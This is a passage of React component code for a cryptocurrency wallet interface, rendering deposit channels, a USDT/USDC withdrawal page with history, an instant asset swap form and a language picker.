                    className="w-full py-3.5 bg-[#0052d4] hover:bg-blue-600 text-white font-bold text-sm rounded-xl transition shadow-md shadow-blue-500/15 cursor-pointer disabled:bg-blue-300 flex items-center justify-center gap-2"
                  >
                    {loading ? (
                      <>
                        <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                        Submitting Deposit...
                      </>
                    ) : (
                      'Confirm'
                    )}
                  </button>

                  {/* Official Deposit Channels */}
                  <div className="pt-2 border-t border-slate-100 space-y-2">
                    <div className="text-[11px] font-bold text-slate-700 px-0.5">Official Deposit Channels</div>
                    {officialChannels.map((channel, i) => (
                      <div
                        key={i}
                        className="flex items-center justify-between p-2.5 bg-white border border-slate-100 rounded-xl hover:bg-slate-50 transition cursor-pointer shadow-3xs"
                        onClick={() => {
                          window.open(channel.url, '_blank');
                        }}
                      >
                        <div className="flex items-center gap-2.5">
                          <div className={`w-5 h-5 rounded-md ${channel.color} flex items-center justify-center text-white text-[10px] font-bold shrink-0`}>
                            {channel.logo}
                          </div>
                          <span className="text-xs font-semibold text-slate-800">{channel.name}</span>
                        </div>
                        <ChevronRight className="w-3.5 h-3.5 text-slate-400" />
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Dedicated Fullscreen Withdraw Page View */}
      <AnimatePresence>
        {activeModal === 'withdraw' && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 10 }}
            transition={{ duration: 0.18 }}
            className="fixed inset-0 z-50 bg-[#f8fafc] flex flex-col font-sans text-slate-800"
          >
            {/* Top Navigation Bar */}
            <header className="bg-white border-b border-slate-200/80 px-4 py-3.5 sm:px-6 flex items-center justify-between sticky top-0 z-30 shadow-2xs">
              <button
                type="button"
                onClick={() => {
                  setActiveModal(null);
                  setShowWithdrawHistory(false);
                  setErrorMsg('');
                  setSuccessMsg('');
                }}
                className="flex items-center gap-1.5 text-slate-700 hover:text-slate-900 px-2.5 py-1.5 rounded-xl hover:bg-slate-100 transition cursor-pointer font-bold text-sm"
              >
                <ArrowLeft className="w-5 h-5 text-slate-600" />
                <span>Back</span>
              </button>

              <div className="text-center">
                <h2 className="text-base font-extrabold text-slate-900">
                  {showWithdrawHistory ? 'Withdrawal History' : 'Withdraw USDT'}
                </h2>
                <p className="text-[11px] text-slate-500 font-medium">
                  {showWithdrawHistory ? 'Past settlement records' : 'Ethereum Network Settlement'}
                </p>
              </div>

              <button
                type="button"
                onClick={() => setShowWithdrawHistory(!showWithdrawHistory)}
                className={`px-3 py-1.5 rounded-xl transition cursor-pointer flex items-center gap-1.5 text-xs font-bold ${
                  showWithdrawHistory
                    ? 'bg-blue-100 text-[#0052d4]'
                    : 'bg-slate-100 hover:bg-slate-200 text-slate-700'
                }`}
              >
                <History className="w-4 h-4" />
                <span>{showWithdrawHistory ? 'Withdraw' : 'History'}</span>
              </button>
            </header>

            {/* Scrollable Content */}
            <main className="flex-1 overflow-y-auto p-3 sm:p-4">
              <div className="max-w-md mx-auto w-full">
                {showWithdrawHistory ? (
                  <div className="space-y-2.5">
                    <div className="flex justify-between items-center pb-1">
                      <div className="flex items-center gap-1.5">
                        <History className="w-4 h-4 text-[#0052d4]" />
                        <h3 className="font-extrabold text-slate-800 text-sm">Withdrawal Records</h3>
                      </div>
                      <button
                        type="button"
                        onClick={() => setShowWithdrawHistory(false)}
                        className="text-xs text-[#0052d4] font-bold cursor-pointer hover:underline"
                      >
                        &larr; Back to Withdraw
                      </button>
                    </div>

                    {historyLogs.filter((l) => l.type === 'withdraw').length === 0 ? (
                      <div className="text-center py-12 bg-white rounded-2xl border border-slate-200/80 text-slate-400 space-y-2 shadow-2xs">
                        <History className="w-8 h-8 mx-auto text-slate-300" />
                        <p className="text-xs font-semibold">No withdrawal history records found.</p>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        {historyLogs
                          .filter((l) => l.type === 'withdraw')
                          .map((log, idx) => {
                            const statusColor =
                              log.status === 'success'
                                ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                                : log.status === 'failed'
                                ? 'bg-red-50 text-red-700 border-red-200'
                                : 'bg-amber-50 text-amber-700 border-amber-200';

                            const statusText =
                              log.status === 'success'
                                ? 'Approved'
                                : log.status === 'failed'
                                ? 'Rejected'
                                : 'Pending Approval';

                            return (
                              <div
                                key={log.id || idx}
                                className="bg-white border border-slate-200/80 rounded-xl p-3 shadow-2xs space-y-1.5 hover:border-slate-300 transition"
                              >
                                <div className="flex justify-between items-center">
                                  <span className="font-extrabold text-slate-900 text-xs">
                                    Withdrawal {log.currency || 'USDT'}
                                  </span>
                                  <span
                                    className={`text-[9px] font-extrabold px-2 py-0.5 rounded-full border ${statusColor}`}
                                  >
                                    {statusText}
                                  </span>
                                </div>

                                <div className="flex justify-between items-baseline">
                                  <span className="text-[11px] text-slate-500 font-medium">Amount:</span>
                                  <span className="font-mono font-extrabold text-slate-900 text-sm">
                                    -{log.amount} {log.currency || 'USDT'}
                                  </span>
                                </div>

                                <div className="text-[10px] text-slate-400 font-mono flex items-center justify-between pt-1 border-t border-slate-100">
                                  <span>{new Date(log.timestamp).toLocaleString()}</span>
                                </div>
                              </div>
                            );
                          })}
                      </div>
                    )}
                  </div>
                ) : (
                  <form onSubmit={handleWithdraw} className="space-y-3">
                    {/* Unified Main Card */}
                    <div className="bg-white p-4 rounded-2xl border border-slate-200/80 shadow-2xs space-y-3">
                      {/* Currency Selector & Available balance */}
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-slate-500 font-bold">Asset</span>
                        <div className="relative">
                          <button
                            type="button"
                            onClick={() => setShowWithdrawCurrencyDropdown(!showWithdrawCurrencyDropdown)}
                            className="flex items-center gap-1.5 font-bold text-slate-800 text-xs bg-slate-50 hover:bg-slate-100 px-2.5 py-1 rounded-lg border border-slate-200 shadow-2xs transition cursor-pointer"
                          >
                            <span className={`w-3.5 h-3.5 rounded-full flex items-center justify-center text-[9px] text-white font-bold ${withdrawCurrency.startsWith('USDT') ? 'bg-[#009393]' : 'bg-[#2775ca]'}`}>
                              {withdrawCurrency.startsWith('USDT') ? '₮' : '$'}
                            </span>
                            <span>{withdrawCurrency}</span>
                            <ChevronDown className="w-3 h-3 text-slate-400" />
                          </button>

                          {showWithdrawCurrencyDropdown && (
                            <div className="absolute right-0 top-8 w-36 bg-white border border-slate-200 rounded-xl shadow-xl z-30 overflow-hidden py-1">
                              {['USDT-ETH', 'USDC-ETH'].map((cur) => (
                                <button
                                  key={cur}
                                  type="button"
                                  onClick={() => {
                                    setWithdrawCurrency(cur);
                                    setSelectedCurrency(cur.startsWith('USDT') ? 'USDT' : 'USDC');
                                    setShowWithdrawCurrencyDropdown(false);
                                  }}
                                  className={`w-full px-3 py-2 text-left text-xs font-bold flex items-center gap-1.5 hover:bg-slate-50 transition cursor-pointer ${
                                    withdrawCurrency === cur ? 'text-[#0066ff] bg-blue-50' : 'text-slate-700'
                                  }`}
                                >
                                  <span className={`w-3.5 h-3.5 rounded-full flex items-center justify-center text-[9px] text-white font-bold ${cur.startsWith('USDT') ? 'bg-[#009393]' : 'bg-[#2775ca]'}`}>
                                    {cur.startsWith('USDT') ? '₮' : '$'}
                                  </span>
                                  <span>{cur}</span>
                                </button>
                              ))}
                            </div>
                          )}
                        </div>
                      </div>

                      {/* Available Balance row */}
                      <div className="flex items-center justify-between p-2.5 bg-slate-50 rounded-xl border border-slate-100">
                        <div>
                          <span className="text-[10px] text-slate-400 font-bold block">Available Balance</span>
                          <span className="font-mono font-extrabold text-base text-slate-900 leading-tight">
                            {getAvailableBalanceFor(selectedCurrency).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 })}{' '}
                            <span className="text-xs font-bold text-slate-500">{selectedCurrency}</span>
                          </span>
                        </div>
                        <button
                          type="button"
                          onClick={() => setActionAmount(getAvailableBalanceFor(selectedCurrency).toString())}
                          className="px-2.5 py-1 bg-blue-50 hover:bg-blue-100 text-[#0052d4] font-bold text-xs rounded-lg transition cursor-pointer border border-blue-200"
                        >
                          Max All
                        </button>
                      </div>

                      {/* Withdraw Amount Input */}
                      <div>
                        <div className="flex justify-between items-center mb-1">
                          <label className="text-xs font-bold text-slate-700">Withdraw Amount</label>
                          <span className="text-[10px] text-slate-400">Min: <strong className="text-slate-600">{minWithdrawUSDT} {selectedCurrency}</strong></span>
                        </div>
                        <div className="relative">
                          <input
                            type="number"
                            step="any"
                            value={actionAmount}
                            onChange={(e) => {
                              setActionAmount(e.target.value);
                              setErrorMsg('');
                            }}
                            placeholder="0.00"
                            className="w-full p-2.5 pr-14 bg-slate-50 border border-slate-200 rounded-xl text-base font-mono font-extrabold text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#0066ff] focus:bg-white transition"
                          />
                          <span className="absolute right-2.5 top-1/2 -translate-y-1/2 font-bold text-[11px] text-slate-500 bg-slate-200/80 px-1.5 py-0.5 rounded">
                            {selectedCurrency}
                          </span>
                        </div>

                        {/* Quick Percentages */}
                        <div className="grid grid-cols-4 gap-1.5 mt-1.5">
                          {[0.25, 0.5, 0.75, 1.0].map((pct) => {
                            const avail = getAvailableBalanceFor(selectedCurrency);
                            const val = (avail * pct).toFixed(2);
                            return (
                              <button
                                key={pct}
                                type="button"
                                onClick={() => setActionAmount(val)}
                                className="py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-lg text-[11px] font-bold transition cursor-pointer border border-slate-200/60"
                              >
                                {pct * 100}%
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      {/* Destination Address */}
                      <div>
                        <div className="flex items-center justify-between mb-1">
                          <label className="text-xs font-bold text-slate-700">Destination Address</label>
                          <span className="text-[9px] text-emerald-700 bg-emerald-50 px-1.5 py-0.5 rounded font-bold flex items-center gap-1 border border-emerald-200">
                            <Check className="w-2.5 h-2.5 text-emerald-600" /> Connected
                          </span>
                        </div>
                        <div className="p-2.5 bg-slate-50 border border-slate-200 rounded-xl font-mono text-[11px] font-bold text-slate-700 break-all select-all flex items-center justify-between gap-1.5">
                          <span className="truncate">{connectedAddress || account.walletAddress || withdrawAddressInput}</span>
                          <Lock className="w-3.5 h-3.5 text-slate-400 shrink-0" />
                        </div>
                      </div>

                      {/* Fee & Handling Summary */}
                      <div className="flex items-center justify-between text-[11px] text-slate-500 pt-1 border-t border-slate-100">
                        <span>Handling Fee: <strong className="text-emerald-600 font-bold">0% (Free)</strong></span>
                        <span>Time: <strong className="text-slate-700 font-bold">1 - 5 mins</strong></span>
                      </div>
                    </div>

                    {errorMsg && (
                      <div className="p-3 bg-red-50 border border-red-200 rounded-xl flex items-start gap-2 text-left">
                        <ShieldAlert className="w-4 h-4 text-red-500 shrink-0 mt-0.5" />
                        <p className="text-xs text-red-600 font-bold leading-relaxed">{errorMsg}</p>
                      </div>
                    )}
                    {successMsg && (
                      <div className="p-3 bg-emerald-50 border border-emerald-200 rounded-xl flex items-start gap-2 text-left">
                        <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                        <p className="text-xs text-emerald-700 font-bold leading-relaxed">{successMsg}</p>
                      </div>
                    )}

                    {/* Submit Button */}
                    <button
                      type="submit"
                      disabled={loading}
                      className="w-full py-3 bg-[#0052d4] hover:bg-blue-700 text-white font-bold text-sm rounded-xl transition shadow-md shadow-blue-500/20 cursor-pointer disabled:opacity-50 flex items-center justify-center gap-2"
                    >
                      {loading ? (
                        <div className="flex items-center gap-2">
                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                          <span>Processing...</span>
                        </div>
                      ) : (
                        'Confirm Withdrawal'
                      )}
                    </button>
                  </form>
                )}
              </div>
            </main>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Dedicated Fullscreen Exchange / Swap Page View */}
      <AnimatePresence>
        {activeModal === 'exchange' && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 10 }}
            transition={{ duration: 0.18 }}
            className="fixed inset-0 z-50 bg-[#f8fafc] flex flex-col font-sans text-slate-800"
          >
            {/* Top Navigation Bar */}
            <header className="bg-white border-b border-slate-200/80 px-4 py-3.5 sm:px-6 flex items-center justify-between sticky top-0 z-30 shadow-2xs">
              <button
                type="button"
                onClick={() => {
                  setActiveModal(null);
                  setShowExchangeHistory(false);
                  setErrorMsg('');
                  setSuccessMsg('');
                  if (onClearInitialModal) onClearInitialModal();
                }}
                className="flex items-center gap-1.5 text-slate-700 hover:text-slate-900 px-2.5 py-1.5 rounded-xl hover:bg-slate-100 transition cursor-pointer font-bold text-sm"
              >
                <ArrowLeft className="w-5 h-5 text-slate-600" />
                <span>Back</span>
              </button>

              <div className="text-center">
                <h2 className="text-base font-extrabold text-slate-900">
                  {showExchangeHistory ? 'Swap History' : 'Instant Exchange'}
                </h2>
                <p className="text-[11px] text-slate-500 font-medium">
                  {showExchangeHistory ? 'Past swap transactions' : 'Real-time Market Rate Swap'}
                </p>
              </div>

              <button
                type="button"
                onClick={() => setShowExchangeHistory(!showExchangeHistory)}
                className={`px-3 py-1.5 rounded-xl transition cursor-pointer flex items-center gap-1.5 text-xs font-bold ${
                  showExchangeHistory
                    ? 'bg-blue-100 text-[#0052d4]'
                    : 'bg-slate-100 hover:bg-slate-200 text-slate-700'
                }`}
              >
                <History className="w-4 h-4" />
                <span>{showExchangeHistory ? 'Swap' : 'History'}</span>
              </button>
            </header>

            {/* Scrollable Content */}
            <main className="flex-1 overflow-y-auto p-3 sm:p-4">
              <div className="max-w-md mx-auto w-full space-y-3">
                {showExchangeHistory ? (
                  <div className="space-y-2.5">
                    <div className="flex justify-between items-center pb-1">
                      <div className="flex items-center gap-1.5">
                        <History className="w-4 h-4 text-[#0052d4]" />
                        <h3 className="font-extrabold text-slate-800 text-sm">Exchange Records</h3>
                      </div>
                      <button
                        type="button"
                        onClick={() => setShowExchangeHistory(false)}
                        className="text-xs text-[#0052d4] font-bold cursor-pointer hover:underline"
                      >
                        &larr; Back to Swap
                      </button>
                    </div>

                    {historyLogs.filter((l) => l.type === 'exchange').length === 0 ? (
                      <div className="text-center py-12 bg-white rounded-2xl border border-slate-200/80 text-slate-400 space-y-2 shadow-2xs">
                        <History className="w-8 h-8 mx-auto text-slate-300" />
                        <p className="text-xs font-semibold">No swap records found.</p>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        {historyLogs
                          .filter((l) => l.type === 'exchange')
                          .map((log, idx) => (
                            <div
                              key={log.id || idx}
                              className="bg-white border border-slate-200/80 rounded-xl p-3 shadow-2xs space-y-1.5 hover:border-slate-300 transition"
                            >
                              <div className="flex justify-between items-center">
                                <span className="font-extrabold text-slate-900 text-xs">
                                  Swap {log.currency}
                                </span>
                                <span className="text-[9px] font-extrabold px-2 py-0.5 rounded-full border bg-emerald-50 text-emerald-700 border-emerald-200">
                                  Completed
                                </span>
                              </div>
                              <p className="text-xs text-slate-600 font-medium">{log.details}</p>
                              <div className="text-[10px] text-slate-400 font-mono flex items-center justify-between pt-1 border-t border-slate-100">
                                <span>{new Date(log.timestamp).toLocaleString()}</span>
                              </div>
                            </div>
                          ))}
                      </div>
                    )}
                  </div>
                ) : (
                  <form onSubmit={handleExchange} className="space-y-3">
                    {/* Live Market Rate Notice Banner */}
                    <div className="p-3 bg-blue-50 border border-blue-200/80 rounded-2xl text-[11px] text-blue-900 flex items-start gap-2.5 shadow-2xs">
                      <Info className="w-4 h-4 text-blue-600 shrink-0 mt-0.5" />
                      <div className="space-y-0.5">
                        <div className="font-bold">
                          Swap between asset types instantly. Available rate: <strong className="text-[#0052d4] font-extrabold">{getExchangeRateText()}</strong>.
                        </div>
                        <div className="text-[10px] text-blue-700 font-medium flex items-center gap-1">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                          <span>Live Market Price • Real-time Slippage 0%</span>
                        </div>
                      </div>
                    </div>

                    {/* Main Swap Card */}
                    <div className="bg-white p-3.5 sm:p-4 rounded-2xl border border-slate-200/80 shadow-2xs space-y-3">
                      {/* From Currency Block */}
                      <div className="bg-slate-50 p-3 rounded-xl border border-slate-200/80 space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider">Pay From</span>
                          <span className="text-[11px] text-slate-500 font-medium">
                            Bal: <strong className="text-slate-800 font-mono">{getAvailableBalanceFor(exchangeFrom).toLocaleString(undefined, { maximumFractionDigits: 6 })} {exchangeFrom}</strong>
                          </span>
                        </div>

                        <div className="flex items-center justify-between gap-2">
                          <select
                            value={exchangeFrom}
                            onChange={(e) => {
                              const newFrom = e.target.value;
                              setExchangeFrom(newFrom);
                              if (newFrom === exchangeTo) {
                                setExchangeTo(newFrom === 'USDT' ? 'ETH' : 'USDT');
                              }
                            }}
                            className="p-2 bg-white border border-slate-200 rounded-xl text-xs font-extrabold text-slate-800 focus:outline-none focus:ring-2 focus:ring-[#0066ff] cursor-pointer shadow-2xs shrink-0"
                          >
                            <option value="USDT">₮ USDT</option>
                            <option value="ETH">Ξ ETH</option>
                            <option value="USDC">$ USDC</option>
                            <option value="BTC">₿ BTC</option>
                          </select>

                          {/* Amount Input with ALL Button right next to it */}
                          <div className="relative flex-1">
                            <input
                              type="number"
                              step="any"
                              value={actionAmount}
                              onChange={(e) => {
                                setActionAmount(e.target.value);
                                setErrorMsg('');
                              }}
                              placeholder="0.00"
                              className="w-full p-2 pr-14 bg-white border border-slate-200 rounded-xl text-sm font-mono font-extrabold text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#0066ff] transition"
                              required
                            />
                            <button
                              type="button"
                              onClick={() => {
                                const avail = getAvailableBalanceFor(exchangeFrom);
                                setActionAmount(avail.toString());
                                setErrorMsg('');
                              }}
                              className="absolute right-1.5 top-1/2 -translate-y-1/2 px-2 py-0.5 bg-blue-50 hover:bg-blue-100 text-[#0052d4] font-extrabold text-[11px] rounded-md transition cursor-pointer border border-blue-200"
                            >
                              ALL
                            </button>
                          </div>
                        </div>

                        {/* Quick Percentages */}
                        <div className="grid grid-cols-4 gap-1.5 pt-1">
                          {[0.25, 0.5, 0.75, 1.0].map((pct) => {
                            const avail = getAvailableBalanceFor(exchangeFrom);
                            const val = (avail * pct).toFixed(exchangeFrom === 'ETH' || exchangeFrom === 'BTC' ? 6 : 2);
                            return (
                              <button
                                key={pct}
                                type="button"
                                onClick={() => {
                                  setActionAmount(val);
                                  setErrorMsg('');
                                }}
                                className="py-1 bg-white hover:bg-slate-100 text-slate-700 rounded-lg text-[11px] font-bold transition cursor-pointer border border-slate-200 shadow-2xs"
                              >
                                {pct * 100}%
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      {/* Swap Direction Switch Button */}
                      <div className="flex justify-center -my-1 relative z-10">
                        <button
                          type="button"
                          onClick={() => {
                            const prevFrom = exchangeFrom;
                            const prevTo = exchangeTo;
                            setExchangeFrom(prevTo);
                            setExchangeTo(prevFrom);
                            setActionAmount('');
                            setErrorMsg('');
                          }}
                          className="p-2 bg-blue-50 hover:bg-blue-100 text-[#0052d4] rounded-full border border-blue-200 shadow-xs transition active:rotate-180 duration-200 cursor-pointer"
                          title="Switch Swap Direction"
                        >
                          <RefreshCw className="w-4 h-4" />
                        </button>
                      </div>

                      {/* To Currency Block */}
                      <div className="bg-slate-50 p-3 rounded-xl border border-slate-200/80 space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider">Receive To</span>
                          <span className="text-[11px] text-slate-500 font-medium">
                            Bal: <strong className="text-slate-800 font-mono">{getAvailableBalanceFor(exchangeTo).toLocaleString(undefined, { maximumFractionDigits: 6 })} {exchangeTo}</strong>
                          </span>
                        </div>

                        <div className="flex items-center justify-between gap-2">
                          <select
                            value={exchangeTo}
                            onChange={(e) => {
                              const newTo = e.target.value;
                              setExchangeTo(newTo);
                              if (newTo === exchangeFrom) {
                                setExchangeFrom(newTo === 'USDT' ? 'ETH' : 'USDT');
                              }
                            }}
                            className="p-2 bg-white border border-slate-200 rounded-xl text-xs font-extrabold text-slate-800 focus:outline-none focus:ring-2 focus:ring-[#0066ff] cursor-pointer shadow-2xs shrink-0"
                          >
                            <option value="ETH">Ξ ETH</option>
                            <option value="USDT">₮ USDT</option>
                            <option value="USDC">$ USDC</option>
                            <option value="BTC">₿ BTC</option>
                          </select>

                          <div className="flex-1 p-2 bg-slate-100/80 border border-slate-200 rounded-xl text-sm font-mono font-extrabold text-emerald-600 text-right truncate">
                            {parseFloat(actionAmount) > 0 ? getEstimatedReceived() : '0.00'} <span className="text-xs text-emerald-700">{exchangeTo}</span>
                          </div>
                        </div>
                      </div>

                      {/* Swap details & live summary */}
                      <div className="space-y-1 text-[11px] text-slate-500 pt-2 border-t border-slate-100">
                        <div className="flex justify-between">
                          <span>Live Exchange Rate:</span>
                          <span className="font-mono font-bold text-slate-800">{getExchangeRateText()}</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Handling Fee:</span>
                          <span className="font-bold text-emerald-600">0% (Zero Fee)</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Slippage Tolerance:</span>
                          <span className="font-bold text-slate-700">0.00%</span>
                        </div>
                      </div>
                    </div>

                    {errorMsg && (
                      <div className="p-3 bg-red-50 border border-red-200 rounded-xl flex items-start gap-2 text-left">
                        <ShieldAlert className="w-4 h-4 text-red-500 shrink-0 mt-0.5" />
                        <p className="text-xs text-red-600 font-bold leading-relaxed">{errorMsg}</p>
                      </div>
                    )}
                    {successMsg && (
                      <div className="p-3 bg-emerald-50 border border-emerald-200 rounded-xl flex items-start gap-2 text-left">
                        <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                        <p className="text-xs text-emerald-700 font-bold leading-relaxed">{successMsg}</p>
                      </div>
                    )}

                    {/* Submit Button */}
                    <button
                      type="submit"
                      disabled={loading}
                      className="w-full py-3 bg-[#0052d4] hover:bg-blue-700 text-white font-bold text-sm rounded-xl transition shadow-md shadow-blue-500/20 cursor-pointer disabled:opacity-50 flex items-center justify-center gap-2"
                    >
                      {loading ? (
                        <div className="flex items-center gap-2">
                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                          <span>Swapping Assets...</span>
                        </div>
                      ) : (
                        'Confirm Instant Swap'
                      )}
                    </button>
                  </form>
                )}
              </div>
            </main>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Language Selection Modal */}
      <AnimatePresence>
        {showLanguageModal && (
          <div
            className="fixed inset-0 bg-black/50 backdrop-blur-xs z-50 flex items-center justify-center p-4"
            onClick={() => setShowLanguageModal(false)}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-white rounded-2xl w-full max-w-xs overflow-hidden shadow-2xl border border-slate-100 flex flex-col max-h-[85vh]"
            >
              <div className="p-3.5 border-b border-slate-100 flex justify-between items-center bg-slate-50/80">
                <span className="font-bold text-slate-800 text-sm flex items-center gap-2">
                  <Globe className="w-4 h-4 text-[#0088ff]" /> {t('select_language')}
                </span>
                <button
                  type="button"
                  onClick={() => setShowLanguageModal(false)}
                  className="p-1 text-slate-400 hover:text-slate-600 rounded-full hover:bg-slate-200 transition cursor-pointer"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="overflow-y-auto divide-y divide-slate-100">
                {LANGUAGES.map((lang, index) => {
                  const isSelected = langName === lang.name;
                  return (
                    <button
                      key={`${lang.id}-${index}`}
                      type="button"
                      onClick={() => {
                        setLanguage(lang.id, lang.name);
                        setShowLanguageModal(false);
                      }}
                      className={`w-full py-3.5 px-4 text-center font-medium text-sm transition cursor-pointer ${
                        isSelected
                          ? 'bg-blue-50/90 text-[#0088ff] font-bold'
                          : 'text-slate-700 hover:bg-slate-50'
                      }`}
                    >
                      {lang.name}
                    </button>
                  );
                })}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
